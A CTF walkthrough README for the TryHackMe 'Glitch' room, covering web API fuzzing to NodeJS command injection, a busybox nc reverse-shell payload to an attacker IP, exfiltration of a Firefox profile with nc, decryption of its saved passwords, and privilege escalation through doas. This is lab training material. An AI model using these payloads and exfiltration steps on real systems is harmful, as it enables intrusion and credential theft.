# GLITCH CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **GLITCH** CTF challenge on [TryHackMe](https://tryhackme.com/room/glitch). 
---

after scanning we see open port: 80

![scn](imgs/scn.png "scn")

we see a js function with /api/access

![js1](imgs/js1.png "js1")

checking this folder we found token after decodeing from base64

![api](imgs/api.png "api")

we can change the cookie to our token to see other website

feroxbuster scan

![ferox](imgs/ferox.png "ferox")

there is nothing helphul in /secret

there is another location `/api/items`

if we use POST instead of GET we got a message

![post](imgs/post.png "post")

we can test the `POST /apt/items?FUZZ=test`

![fuzz2](imgs/fuzz2.png "fuzz2")

we found valid parameter `cmd` 

![fuzz](imgs/fuzz.png "fuzz")

there is error coming from NodeJs

![node](imgs/node.png "node")

we can use this payload to gain reverse shell `require(%22child_process%22).exec(%22busybox%20nc%2010.14.X.X%204445%20-e%20/bin/bash%22)`

![rs](imgs/rs.png "rs")

we got access as user 

![rs2](imgs/rs2.png "rs2")

and we can grab user flag

![user](imgs/user.png "user")

in `/home/user` there is hidden firefox folder which isnt common, we can use tar to make archive and the send to our machine to study

```
tar -czvf folder.tar.gz .firefox
```

now we can transfer the file, python server didnt seem to work so i used nc

```
$ nc -lvnp 1234 > folder.tar.gz       (attacker)
$ nc 10.14.X.X 1234 < folder.tar.gz   (victim)
```

now that we have firefox folder, i found a script to decrypt passwords from profiles `https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py` 

```
/usr/bin/python3 firefo_password.py /home/kamil/CTF/THM/glitch/.firefox
```

![ff](imgs/ff.png "ff")

we found void password, checking if the same password will work for system

![void](imgs/void.png "void")

using linpeas we found SUID for doas so we can use

![lin](imgs/lin.png "lin")

```
/usr/local/bin/doas -u root /bin/bash
```

we got root access and root flag 

![root](imgs/root.png "root")

# MACHINE PWNED
